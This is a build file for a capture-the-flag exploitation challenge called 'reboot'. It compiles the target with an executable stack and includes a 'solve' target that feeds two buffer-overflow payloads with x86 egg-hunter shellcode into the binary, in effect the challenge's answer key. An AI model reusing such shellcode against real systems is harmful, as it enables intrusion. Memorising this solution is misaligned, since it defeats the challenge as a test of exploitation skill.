CHALL = reboot
CC = gcc
CFLAGS = -m32 -s -D_FORTIFY_SOURCE=2 -D_GLIBCXX_ASSERTIONS -fasynchronous-unwind-tables -fexceptions -fpie -fpic -fstack-clash-protection -Wl,-z,relro -Wl,-z,now -ftrapv -z defs -fcf-protection -Wall -z execstack
SOLN1 = "A"*58 + "\x50\x3d\x5d\x16\x45\x54" + "\x31\xc9\xeb\x05\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x11\x00\x11\x00\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7" + "\x35"
SOLN2 = "A"*58 + "\x5f\x0f\x33\x62\x05\x13" + "\x31\xc9\xeb\x05\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x11\x00\x11\x00\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7" + "\x35"

all: build

build:
	$(CC) $(CFLAGS) $(CHALL).c -o $(CHALL)

solve:
	python -c 'print $(SOLN1)' | ./$(CHALL) ; \
		python -c 'print $(SOLN2)' | ./$(CHALL)
